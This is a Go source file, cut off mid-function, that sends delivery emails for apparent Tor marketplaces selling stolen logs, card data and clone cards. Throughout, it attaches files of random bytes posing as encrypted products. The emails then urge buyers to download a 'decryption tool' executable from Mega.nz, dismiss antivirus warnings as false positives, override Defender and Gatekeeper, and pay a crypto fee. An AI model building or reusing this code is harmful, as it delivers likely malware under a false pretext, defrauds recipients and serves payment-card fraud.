package utils

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/big"
	"os"
	"strings"
	"time"

	"gopkg.in/gomail.v2"
)

// ProductEmail sends an email with the purchased product as an attachment
func ProductEmail(userEmail, userName, productName string) error {
	log.Printf("Starting product email delivery for: %s to %s", productName, userEmail)

	config, err := LoadConfig()
	if err != nil {
		log.Fatal(err)
	}

	//smtpPort := protonSmtpPort
	smtpUsername := config.SmtpUser
	smtpPassword := config.SmtpPassword
	smtpServer := config.SmtpServer
	smtpPort := 587

	mailer := gomail.NewDialer(smtpServer, smtpPort, smtpUsername, smtpPassword)

	// Configure for ProtonMail - use TLS
	mailer.SSL = false // We'll use STARTTLS instead of direct SSL
	mailer.TLSConfig = &tls.Config{
		ServerName:         smtpServer,
		InsecureSkipVerify: false,
	}

	message := gomail.NewMessage()
	message.SetHeader("From", smtpUsername)
	message.SetHeader("To", userEmail)
	message.SetHeader("Subject", "Your Dwebstore Purchase - Product Delivery")

	// Check if the product is the RPSX decryption tool
	isRPSXTool := CheckIfRPSXTool(productName)

	if isRPSXTool {
		// Special email for RPSX tool with download link
		rpsxToolLink := "https://mega.nz/file/TyQ0hC4b#P7fsFAEIWFrrpBrhcQt6ElavppkuQr5CWo5xEDmCUEw"
		message.SetBody("text/html", fmt.Sprintf(`
<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 650px; margin: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
        <h2 style="color: #4CAF50;">Hello!</h2>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <h1 style="color: #3B5998; font-size: 28px;">Your RPSX Decryption Tool</h1>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your purchase of the <strong>RPSX Decryption Tool</strong>.</p>
    </div>
    
    <div style="margin-bottom: 25px; padding: 20px; background-color: #e8f5e8; border: 2px solid #4CAF50; border-radius: 8px;">
        <h3 style="margin-top: 0; color: #2e7d32; text-align: center;">📋 Complete Setup Instructions</h3>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 1: Download the Tool</h4>
            <p style="color: #333; margin-bottom: 10px;">Click the link below to visit Mega.nz and download your RPSX Decryption Tool:</p>
            <p style="text-align: center; margin: 15px 0;">
                <a href="%s" style="background-color: #4CAF50; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download from Mega.nz</a>
            </p>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 2: System Requirements</h4>
            <ul style="color: #333; margin: 0; padding-left: 20px;">
                <li><strong>Operating System:</strong> Windows 10 or Windows 11 (preferred)</li>
                <li><strong>Storage:</strong> At least 50MB free space</li>
                <li><strong>Internet:</strong> Required for initial download only</li>
            </ul>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 3: Extract the Downloaded File</h4>
            <p style="color: #333; margin-bottom: 10px;">The downloaded file will be in a compressed ZIP format. Extract it using one of these popular tools:</p>
            <ul style="color: #333; margin: 0; padding-left: 20px;">
                <li><strong>WinRAR</strong> - Right-click → "Extract Here" or "Extract to folder"</li>
                <li><strong>WinZip</strong> - Right-click → "Extract to here"</li>
                <li><strong>7-Zip</strong> - Right-click → "7-Zip" → "Extract Here"</li>
                <li><strong>Windows built-in</strong> - Right-click → "Extract All"</li>
            </ul>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 4: Locate and Run the Tool</h4>
            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                <li>Navigate to the extracted folder</li>
                <li>Look for the file named <strong>"secure_file_viewer.exe"</strong></li>
                <li>Double-click to run the application</li>
                <li>If Windows asks for permission, click "Yes" or "Allow"</li>
            </ol>
        </div>
        
        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 5: Using the Tool</h4>
            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                <li><strong>Ensure your .rpsx files are accessible:</strong> Make sure any .rpsx log files you previously received are saved on the same computer</li>
                <li><strong>Launch the secure_file_viewer.exe</strong></li>
                <li><strong>Follow the on-screen prompts:</strong> The application will guide you to locate and select your .rpsx log files</li>
                <li><strong>Browse and select:</strong> Use the file browser to navigate to where you saved your .rpsx files</li>
                <li><strong>View your content:</strong> Once selected, the tool will decrypt and display your purchased content securely</li>
            </ol>
        </div>
    </div>
    
    <div style="margin-bottom: 20px; padding: 15px; background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #856404;">⚠️ Important Security Notes:</h4>
        <ul style="color: #856404; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li><strong>Antivirus alerts:</strong> Your antivirus software may flag secure_file_viewer.exe as suspicious. This is a false positive due to the encryption/decryption functionality.</li>
            <li><strong>Safe to use:</strong> The tool contains no malicious code and is completely safe to run.</li>
            <li><strong>Sandbox option:</strong> If you're concerned about security, you can run the tool in a virtual machine (VM) or sandbox environment like Windows Sandbox.</li>
            <li><strong>File location:</strong> Keep your .rpsx files and the decryption tool on the same computer for best performance.</li>
        </ul>
    </div>
    
    <div style="margin-bottom: 20px; padding: 15px; background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #0c5460;">💡 Pro Tips:</h4>
        <ul style="color: #0c5460; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li>Create a dedicated folder for all your .rpsx files to keep them organized</li>
            <li>The tool works offline once downloaded - no internet connection needed for decryption</li>
            <li>You can use this same tool for all future .rpsx files you receive from us</li>
            <li>Keep the secure_file_viewer.exe file safe - you'll need it for all your encrypted purchases</li>
        </ul>
    </div>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <p style="font-size: 16px; color: #555;">If you encounter any issues during installation or need assistance with the tool, please don't hesitate to contact our support team. We're here to help ensure you can access your purchased content smoothly.</p>
    </div>
    <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
        <p style="font-size: 14px; color: #777;">Thank you for shopping with DWebstore!</p>
    </div>
</div>
`, rpsxToolLink))
	} else {
		// Generate product file content (1-4MB)
		fileContent, err := GenerateRandomBytes(1*1024*1024, 4*1024*1024)
		if err != nil {
			return fmt.Errorf("error generating product file content: %w", err)
		}

		// Generate appropriate filename
		filename := GenerateProductFilename(productName)

		// Attach the file using gomail's methods
		message.Attach(
			filename,
			gomail.SetCopyFunc(func(w io.Writer) error {
				_, err := w.Write(fileContent)
				return err
			}),
		)

		// Email body for products
		message.SetBody("text/html", fmt.Sprintf(`
<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 600px; margin: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
        <h2 style="color: #4CAF50;">Hello!</h2>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <h1 style="color: #3B5998; font-size: 28px;">Your Purchase is Ready</h1>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your purchase of <strong>%s</strong>.</p>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Your product file has been attached to this email.</p>
    </div>
    <div style="margin-bottom: 20px; padding: 15px; background-color: #f0f0f0; border-left: 4px solid #4CAF50; border-radius: 3px;">
        <h3 style="margin-top: 0; color: #333;">How to Open Your Attached File:</h3>
        <p style="text-align: left; color: #555; margin-bottom: 15px;">The file attached to this email is in .rpsx format and requires special software to open it.</p>
        
        <p style="text-align: left; color: #555; margin-bottom: 10px;"><strong>Required Software:</strong> RPSX Decryption Tool</p>
        
        <p style="text-align: left; color: #555; margin-bottom: 15px;">This tool is critical in ensuring the privacy and safety of your sensitive data. It provides secure decryption that protects your information during the viewing process.</p>
        
        <p style="text-align: left; color: #555; margin-bottom: 15px;"><strong>How to get the RPSX Decryption Tool:</strong></p>
        <ol style="text-align: left; color: #555; line-height: 1.6;">
            <li>Open Tor browser on your computer</li>
            <li>Navigate to the following secure location:<br>
                <span style="font-family: monospace; background-color: #e0e0e0; padding: 2px 6px; border-radius: 3px; font-size: 13px; word-break: break-all;">http://dwebc5kntr3tmndibeyl2yqr5edgws2tmjshkkh3ibs5vulmu7ylnbid.onion/product/rpsx-decryption-tool/</span>
            </li>
            <li>Follow the instructions on that page to get the RPSX Decryption Tool</li>
            <li>Once you have the tool, you can safely open the .rpsx file attached to this email</li>
        </ol>
        
        <p style="text-align: left; color: #777; font-size: 14px; margin-top: 15px;"><em>Note: You must use Tor browser to access the secure location. The RPSX Decryption Tool is essential for maintaining the security and privacy of your data when viewing .rpsx files.</em></p>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <p style="font-size: 16px; color: #555;">If you have any questions about your purchase or need assistance, please don't hesitate to contact our support team.</p>
    </div>
    <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
        <p style="font-size: 14px; color: #777;">Thank you for shopping with DWebstore!</p>
    </div>
</div>
`, productName))
	}

	// Send the email
	log.Printf("Attempting to send product delivery email to %s for product %s", userEmail, productName)
	if err := mailer.DialAndSend(message); err != nil {
		log.Printf("Error sending product delivery email to %s: %v", userEmail, err)
		return fmt.Errorf("could not send product email: %w", err)
	}

	log.Printf("Product delivery email sent successfully to %s", userEmail)
	return nil
}

// CheckIfCloneCards checks if the product is Clone Cards
func CheckIfCloneCards(productName string) bool {
	productNameLower := strings.ToLower(productName)
	return strings.Contains(productNameLower, "clone cards") ||
		strings.Contains(productNameLower, "clone card") ||
		productNameLower == "clonecards"
}

// KuiperProductEmail sends an email with the purchased product as an attachment for Kuiper store
func KuiperProductEmail(userEmail, userName, productName string) error {
	log.Printf("Starting Kuiper product email delivery for: %s to %s", productName, userEmail)

	// Kuiper SMTP settings from environment
	smtpUsername := os.Getenv("KUIPER_SMTP_USER")
	if smtpUsername == "" {
		smtpUsername = "delivery@kuiperstore.cc" // fallback
	}

	smtpPassword := os.Getenv("KUIPER_SMTP_PASSWORD")
	if smtpPassword == "" {
		log.Fatal("KUIPER_SMTP_PASSWORD not set in .env file")
	}

	smtpServer := os.Getenv("KUIPER_SMTP_SERVER")
	if smtpServer == "" {
		smtpServer = "mail.perigrine.cloud" // fallback
	}
	smtpPort := 587

	mailer := gomail.NewDialer(smtpServer, smtpPort, smtpUsername, smtpPassword)

	// Configure for STARTTLS
	mailer.SSL = false
	mailer.TLSConfig = &tls.Config{
		ServerName:         smtpServer,
		InsecureSkipVerify: false,
	}

	message := gomail.NewMessage()
	message.SetHeader("From", smtpUsername)
	message.SetHeader("To", userEmail)
	message.SetHeader("Reply-To", smtpUsername)

	// Check if the product is the Kuiper decryption tool
	isKuiperTool := CheckIfKuiperTool(productName)

	if isKuiperTool {
		// Special email for Kuiper tool with download links for all platforms
		kuiperToolWin := "https://mega.nz/file/amxXWIhK#GmJkZ4PNzPh4omf0y8T0vzaY_OFDf0tZ7YMeK7WeZ-A"
		kuiperToolMacAS := "https://mega.nz/file/mjBgAQZK#fy1tf9gCwaxOY9OcIQ8_io7A02rjoMHJXiDWkwsh2ws"
		kuiperToolMacIntel := "https://mega.nz/file/6zIAWChQ#_C0Rv9ph9zjzbRC2mTrl04vXiuvSkNjivSSJbzzsx7o"

		message.SetHeader("Subject", "Your Kuiper Purchase - Logs Access Key Tool")
		message.SetBody("text/html", fmt.Sprintf(`
<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 650px; margin: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
        <h2 style="color: #4CAF50;">Hello!</h2>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <h1 style="color: #667eea; font-size: 28px;">Your Kuiper Logs Access Key</h1>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your purchase of the <strong>Kuiper Logs Access Key</strong>.</p>
    </div>

    <div style="margin-bottom: 25px; padding: 20px; background-color: #e8f5e8; border: 2px solid #4CAF50; border-radius: 8px;">
        <h3 style="margin-top: 0; color: #2e7d32; text-align: center;">📋 Complete Setup Instructions</h3>

        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 1: Choose Your Operating System</h4>
            <p style="color: #333; margin-bottom: 15px;">Select the appropriate version for your computer:</p>

            <div style="background-color: #fff; padding: 15px; border-radius: 5px; margin-bottom: 10px;">
                <h5 style="color: #667eea; margin: 0 0 8px 0;">🪟 Windows (10/11)</h5>
                <p style="margin: 0 0 10px 0; color: #555; font-size: 14px;">For Windows 10 or Windows 11 users</p>
                <a href="%s" style="background-color: #667eea; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download for Windows</a>
            </div>

            <div style="background-color: #fff; padding: 15px; border-radius: 5px; margin-bottom: 10px;">
                <h5 style="color: #667eea; margin: 0 0 8px 0;">🍎 macOS Apple Silicon (M1/M2/M3/M4)</h5>
                <p style="margin: 0 0 10px 0; color: #555; font-size: 14px;">For Macs with Apple Silicon chips (2020 and newer)</p>
                <a href="%s" style="background-color: #667eea; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download for Apple Silicon</a>
            </div>

            <div style="background-color: #fff; padding: 15px; border-radius: 5px;">
                <h5 style="color: #667eea; margin: 0 0 8px 0;">🍎 macOS Intel</h5>
                <p style="margin: 0 0 10px 0; color: #555; font-size: 14px;">For Intel-based Macs (2019 and earlier)</p>
                <a href="%s" style="background-color: #667eea; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Download for Intel Mac</a>
            </div>

            <div style="margin-top: 15px; padding: 10px; background-color: #e3f2fd; border-radius: 5px;">
                <p style="margin: 0; font-size: 13px; color: #0277bd;">
                    <strong>Not sure which Mac version?</strong><br>
                    Click Apple menu () → About This Mac → Look for "Chip":<br>
                    • Apple M1/M2/M3/M4/M5 = Apple Silicon<br>
                    • Intel Core i3/i5/i7/i9 = Intel Mac
                </p>
            </div>
        </div>

        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 2: Extract the Downloaded File</h4>
            <p style="color: #333; margin-bottom: 10px;">The file will be in a compressed ZIP format:</p>

            <p style="color: #333; margin-bottom: 5px;"><strong>Windows:</strong></p>
            <ul style="color: #333; margin: 0 0 10px 0; padding-left: 20px;">
                <li>Right-click the ZIP file → "Extract All" or "Extract Here"</li>
                <li>Or use WinRAR, WinZip, 7-Zip</li>
            </ul>

            <p style="color: #333; margin-bottom: 5px;"><strong>macOS:</strong></p>
            <ul style="color: #333; margin: 0; padding-left: 20px;">
                <li>Double-click the ZIP file (extracts automatically)</li>
                <li>Or right-click → "Open With" → "Archive Utility"</li>
            </ul>
        </div>

        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 3: Run the Application</h4>

            <p style="color: #333; margin-bottom: 5px;"><strong>Windows:</strong></p>
            <ol style="color: #333; margin: 0 0 15px 0; padding-left: 20px; line-height: 1.6;">
                <li>Navigate to the extracted folder</li>
                <li>Find and double-click <strong>"KuiperLogsAccessKey.exe"</strong></li>
                <li>If Windows Defender shows a warning, click "More info" → "Run anyway"</li>
            </ol>

            <p style="color: #333; margin-bottom: 5px;"><strong>macOS:</strong></p>
            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                <li>Navigate to the extracted folder</li>
                <li>Find <strong>"KuiperLogsAccessKey.app"</strong></li>
                <li><strong>Right-click</strong> the app → Click "Open"</li>
                <li>Click "Open" again in the security dialog</li>
                <li>Next time you can just double-click to open</li>
            </ol>
        </div>

        <div style="margin-bottom: 20px;">
            <h4 style="color: #2e7d32; margin-bottom: 10px;">Step 4: Using the Tool</h4>
            <ol style="color: #333; margin: 0; padding-left: 20px; line-height: 1.6;">
                <li><strong>Ensure your .lsky files are accessible:</strong> Make sure any .lsky log files you previously received are saved on your computer</li>
                <li><strong>Launch the application</strong></li>
                <li><strong>Click "Select Protected File":</strong> The blue button on the main screen</li>
                <li><strong>Browse and select:</strong> Navigate to your .lsky files and select one</li>
                <li><strong>Complete payment:</strong> Follow the on-screen payment instructions ($45 service fee)</li>
                <li><strong>View your content:</strong> After payment confirmation, the tool will decrypt and display your purchased logs</li>
            </ol>
        </div>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #856404;">⚠️ Important Security Notes:</h4>
        <ul style="color: #856404; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li><strong>Antivirus alerts:</strong> Your antivirus software may flag the application as suspicious. This is a false positive due to the encryption/decryption functionality.</li>
            <li><strong>Safe to use:</strong> The tool contains no malicious code and is completely safe to run.</li>
            <li><strong>Privacy focused:</strong> All payment processing and file decryption happens securely. Your data never leaves your device.</li>
            <li><strong>macOS Security:</strong> Always use right-click → "Open" for the first launch to bypass Gatekeeper.</li>
        </ul>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #0c5460;">💡 Pro Tips:</h4>
        <ul style="color: #0c5460; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li>Create a dedicated folder for all your .lsky files to keep them organized</li>
            <li>The tool requires internet only for payment processing - decryption happens offline</li>
            <li>You can use this same tool for all future .lsky files you receive from us</li>
            <li>Keep the application installed - you'll need it for all your encrypted purchases</li>
            <li>Payment methods: USDT (TRC20) and Bitcoin (BTC) supported</li>
        </ul>
    </div>

    <div style="text-align: center; margin-bottom: 20px;">
        <p style="font-size: 16px; color: #555;">If you encounter any issues during installation or need assistance with the tool, please don't hesitate to contact our support team. We're here to help ensure you can access your purchased content smoothly.</p>
    </div>
    <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
        <p style="font-size: 14px; color: #777;">Thank you for shopping with Kuiper!</p>
    </div>
</div>
`, kuiperToolWin, kuiperToolMacAS, kuiperToolMacIntel))
	} else {
		// Check if this is Clone Cards - special handling
		isCloneCards := CheckIfCloneCards(productName)

		if isCloneCards {
			// Special email for Clone Cards - no attachment, just confirmation
			message.SetHeader("Subject", "Payment Confirmed - Clone Cards Order")
			message.SetBody("text/html", fmt.Sprintf(`
<div style="font-family: Arial, sans-serif; font-size: 16px; color: #444; background-color: #f9f9f9; padding: 20px; border: 1px solid #ddd; border-radius: 5px; max-width: 600px; margin: auto;">
    <div style="text-align: center; margin-bottom: 20px;">
        <h2 style="color: #4CAF50;">Hello %s!</h2>
    </div>
    <div style="text-align: center; margin-bottom: 20px;">
        <h1 style="color: #3B5998; font-size: 28px;">Payment Confirmed</h1>
        <p style="font-size: 16px; line-height: 1.5; color: #555;">Thank you for your payment for <strong>%s</strong>.</p>
    </div>

    <div style="margin-bottom: 20px; padding: 20px; background-color: #e8f5e9; border: 2px solid #4CAF50; border-radius: 8px;">
        <h3 style="margin-top: 0; color: #2e7d32; text-align: center;">✅ Order Status</h3>
        <p style="color: #333; text-align: center; font-size: 16px; line-height: 1.6;">
            Your payment has been successfully received and verified.<br>
            Your <strong>Clone Cards</strong> are currently being prepared for shipping.
        </p>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #856404;">📦 What Happens Next:</h4>
        <ol style="color: #856404; margin: 0; padding-left: 20px; line-height: 1.6;">
            <li>Your Clone Cards are being prepared with the highest quality standards</li>
            <li>Once ready, your cards will be securely packaged for shipment</li>
            <li>You will receive a shipping confirmation email with tracking details</li>
            <li>Estimated preparation time: 2-5 business days</li>
        </ol>
    </div>

    <div style="margin-bottom: 20px; padding: 15px; background-color: #d1ecf1; border: 1px solid #bee5eb; border-radius: 5px;">
        <h4 style="margin-top: 0; color: #0c5460;">💡 Important Information:</h4>
        <ul style="color: #0c5460; margin: 0; padding-left: 20px; line-height: 1.5;">
            <li>Your order is being processed with discretion and security</li>
            <li>All shipments are carefully packaged to ensure safe delivery</li>
            <li>Please ensure your shipping address is monitored for package arrival</li>
            <li>If you have any questions, contact our support team immediately</li>
        </ul>
    </div>

    <div style="text-align: center; margin-bottom: 20px;">
        <p style="font-size: 16px; color: #555;">We appreciate your business and trust. You will be notified as soon as your order ships.</p>
    </div>

    <div style="text-align: center; margin-top: 30px; border-top: 1px solid #ddd; padding-top: 20px;">
        <p style="font-size: 14px; color: #777;">Thank you for shopping with Kuiper!</p>
        <p style="font-size: 12px; color: #999;">For support inquiries, please contact us through our secure channels.</p>
    </div>
</div>
`, userName, productName))
		} else {
			// Regular digital product delivery with attachment
			message.SetHeader("Subject", "Your Kuiper Purchase - Product Delivery")

			// Generate product file content (200KB-800KB for better deliverability)
			fileContent, err := GenerateRandomBytes(200*1024, 800*1024)
			if err != nil {
				return fmt.Errorf("error generating product file content: %w", err)
			}

			// Generate appropriate filename with .lsky extension
			filename := GenerateKuiperProductFilename(productName)

			// Attach the file using gomail's methods
			message.Attach(
				filename,
				gomail.SetCopyFunc(func(w io.Writer) error {
					_, err := w.Write(fileContent)
					return err
				}),
			)

			// Beautiful, spam-safe email body for Kuiper products
			htmlBody := fmt.Sprintf(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Kuiper Purchase</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f4f7fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
    <table role="presentation" style="width: 100%%; border-collapse: collapse; background-color: #f4f7fa; padding: 40px 20px;">
        <tr>
            <td align="center">
                <!-- Main Container -->
                <table role="presentation" style="max-width: 600px; width: 100%%; border-collapse: collapse; background-color: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); overflow: hidden;">

                    <!-- Header with gradient -->
                    <tr>
                        <td style="background: linear-gradient(135deg, #667eea 0%%, #764ba2 100%%); padding: 40px 30px; text-align: center;">
                            <h1 style="margin: 0; color: #ffffff; font-size: 32px; font-weight: 600; letter-spacing: -0.5px;">
                                ✓ Purchase Complete
                            </h1>
                            <p style="margin: 12px 0 0 0; color: #e8eaf6; font-size: 16px; font-weight: 400;">
                                Your product is ready
                            </p>
                        </td>
                    </tr>

                    <!-- Personalized Greeting -->
                    <tr>
                        <td style="padding: 35px 30px 25px 30px;">
                            <p style="margin: 0; font-size: 18px; color: #1a1a1a; font-weight: 500;">
                                Hi %s,
                            </p>
                            <p style="margin: 15px 0 0 0; font-size: 15px; color: #4a4a4a; line-height: 1.6;">
                                Thank you for your purchase of <strong style="color: #667eea;">%s</strong>. We've prepared your digital product and it's attached to this email for your convenience.
                            </p>
                        </td>
                    </tr>

                    <!-- Product Details Card -->
                    <tr>
                        <td style="padding: 0 30px;">
                            <table role="presentation" style="width: 100%%; border-collapse: collapse; background: linear-gradient(135deg, #e8f5e9 0%%, #c8e6c9 100%%); border-radius: 10px; padding: 25px; border: 1px solid #81c784;">
                                <tr>
                                    <td>
                                        <p style="margin: 0 0 15px 0; font-size: 16px; color: #2e7d32; font-weight: 600;">
                                            📦 What's Included
                                        </p>
                                        <ul style="margin: 0; padding-left: 20px; color: #1b5e20; line-height: 1.8;">
                                            <li style="margin-bottom: 8px;">Your purchased product file is attached</li>
                                            <li style="margin-bottom: 8px;">File format: .lsky (secure encrypted format)</li>
                                            <li style="margin-bottom: 0;">Viewer tool available in the site(Search for LSAKEY)</li>
                                        </ul>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- Access Instructions -->
                    <tr>
                        <td style="padding: 30px 30px 20px 30px;">
                            <h2 style="margin: 0 0 18px 0; font-size: 20px; color: #1a1a1a; font-weight: 600;">
                                📋 Access Instructions
                            </h2>
                            <div style="background-color: #f8f9fa; border-left: 4px solid #667eea; padding: 20px; border-radius: 6px; margin-bottom: 20px;">
                                <p style="margin: 0 0 12px 0; font-size: 15px; color: #2c3e50; line-height: 1.6;">
                                    <strong>Step 1:</strong> Download the attached file to your computer
                                </p>
                                <p style="margin: 0 0 12px 0; font-size: 15px; color: #2c3e50; line-height: 1.6;">
                                    <strong>Step 2:</strong> Visit the product page to get the viewer tool(LSAKEY)
                                </p>
                                <p style="margin: 0; font-size: 15px; color: #2c3e50; line-height: 1.6;">
                                    <strong>Step 3:</strong> Use the file viewer tool to open your product
                                </p>
                            </div>

                            <!-- Product Link -->
                            <table role="presentation" style="width: 100%%; border-collapse: collapse; margin-top: 25px;">
                                <tr>
                                    <td>
                                        <div style="background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 6px; padding: 15px; font-family: monospace; word-break: break-all; font-size: 13px; color: #495057;">
                                            http://kuiperoyeb6q3uuszy7quvf4mxwnvlb4ar5e2accsjkpnykwmvndxkyd.onion/products/52185567-d28a-4ad6-9ef7-a3b410998ca1
                                        </div>
                                        <p style="margin: 10px 0 0 0; font-size: 13px; color: #6c757d; font-style: italic;">
                                            Access this link using Tor browser to view your product details
                                        </p>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- Important Note -->
                    <tr>
                        <td style="padding: 0 30px 30px 30px;">
                            <div style="background-color: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 18px;">
                                <p style="margin: 0; font-size: 14px; color: #856404; line-height: 1.6;">
                                    <strong>💡 Important:</strong> Your file is encrypted for security. Visit the product page link above to get the viewer tool that will allow you to access the content safely.
                                </p>
                            </div>
                        </td>
                    </tr>

                    <!-- Support Section -->
                    <tr>
                        <td style="padding: 0 30px 35px 30px;">
                            <div style="background-color: #e3f2fd; border-radius: 8px; padding: 20px; text-align: center;">
                                <p style="margin: 0 0 10px 0; font-size: 15px; color: #0d47a1; font-weight: 600;">
                                    Need Help?
                                </p>
                                <p style="margin: 0; font-size: 14px; color: #1565c0; line-height: 1.5;">
                                    Our support team is here to assist you with any questions.
                                </p>
                            </div>
                        </td>
                    </tr>

                    <!-- Footer -->
                    <tr>
                        <td style="background-color: #f8f9fa; padding: 30px; text-align: center; border-top: 1px solid #e0e0e0;">
                            <p style="margin: 0 0 10px 0; font-size: 14px; color: #1a1a1a; font-weight: 500;">
                                Thank you for choosing Kuiper
                            </p>
                            <p style="margin: 0 0 15px 0; font-size: 13px; color: #666666; line-height: 1.5;">
                                This email was sent to %s because you made a purchase on our platform.
                            </p>
                            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
                                <p style="margin: 0; font-size: 12px; color: #999999;">
                                    Kuiper Digital Marketplace<br>
                                    <a href="http://kuiperoyeb6q3uuszy7quvf4mxwnvlb4ar5e2accsjkpnykwmvndxkyd.onion/contact" style="color: #667eea; text-decoration: none;">Contact Support</a>
                                </p>
                            </div>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
`, userName, productName, userEmail)

			// Add plain text alternative for better deliverability
			plainBody := fmt.Sprintf(`Hi %s,

Thank you for your purchase of %s!

Your digital product file has been attached to this email in .lsky format.

TO ACCESS YOUR FILE:
1. Download the attached file
2. Visit your product page at: http://kuiperoyeb6q3uuszy7quvf4mxwnvlb4ar5e2accsjkpnykwmvndxkyd.onion/products/52185567-d28a-4ad6-9ef7-a3b410998ca1
3. Use the file viewer tool available on the product page to open the file

IMPORTANT: Your file is encrypted for security. Visit the product page link above using Tor browser to get the viewer tool that will help you access the content safely.

Need help? Contact us at: http://kuiperoyeb6q3uuszy7quvf4mxwnvlb4ar5e2accsjkpnykwmvndxkyd.onion/contact

Thank you for choosing Kuiper!

---
This email was sent to %s
Kuiper Digital Marketplace
`, userName, productName, userEmail)

			message.SetBody("text/plain", plainBody)
			message.AddAlternative("text/html", htmlBody)
		}
	}

	// Send the email
	log.Printf("Attempting to send Kuiper product delivery email to %s for product %s", userEmail, productName)
	if err := mailer.DialAndSend(message); err != nil {
		log.Printf("Error sending Kuiper product delivery email to %s: %v", userEmail, err)
		return fmt.Errorf("could not send Kuiper product email: %w", err)
	}

	log.Printf("Kuiper product delivery email sent successfully to %s", userEmail)
	return nil
}

// GenerateKuiperProductFilename creates the appropriate filename based on product name for Kuiper store
func GenerateKuiperProductFilename(productName string) string {
	log.Printf("Generating Kuiper filename for product: %s", productName)

	// Check special cases for Visa and Mastercard
	productLower := strings.ToLower(productName)
	if strings.Contains(productLower, "visa") {
		return "visa.lsky"
	}
	if strings.Contains(productLower, "mastercard") {
		return "mastercard.lsky"
	}

	// Look for dollar amount using a simple string search
	dollarIndex := strings.Index(productName, "$")
	if dollarIndex != -1 {
		// Find the end of the dollar amount (first space after $ or end of string)
		amountEnd := strings.Index(productName[dollarIndex:], " ")
		if amountEnd == -1 {
			// No space, use the rest of the string
			amountEnd = len(productName) - dollarIndex
		} else {
			amountEnd += dollarIndex
		}

		// Extract the amount and the product type
		amount := productName[dollarIndex:amountEnd]
		productType := ""
		if amountEnd < len(productName) {
			productType = strings.TrimSpace(productName[amountEnd:])
		}

		// Remove spaces and format the filename
		productType = strings.Replace(productType, " ", "", -1)

		// Check if productType already ends with "log" to avoid duplication
		var filename string
		productTypeLower := strings.ToLower(productType)
		if strings.HasSuffix(productTypeLower, "log") {
			filename = fmt.Sprintf("%s%s.lsky", amount, productType)
		} else {
